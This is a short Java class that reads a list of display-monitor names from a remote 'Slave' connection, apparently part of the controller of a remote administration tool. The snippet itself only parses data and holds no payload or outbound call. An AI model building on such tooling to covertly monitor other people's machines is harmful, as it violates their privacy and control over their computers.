package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Monitor;
import com.redpois0n.Slave;

public class PacketMONITOR extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = slave.readInt();
		
		slave.setMonitors(new Monitor[len]);
		
		for (int i = 0; i < len; i++) {
			String name = slave.readLine();
			Monitor monitor = new Monitor();
			
			monitor.setName(name);
			monitor.setIndex(i);
			
			slave.getMonitors()[i] = monitor;
		}
		
	}

}
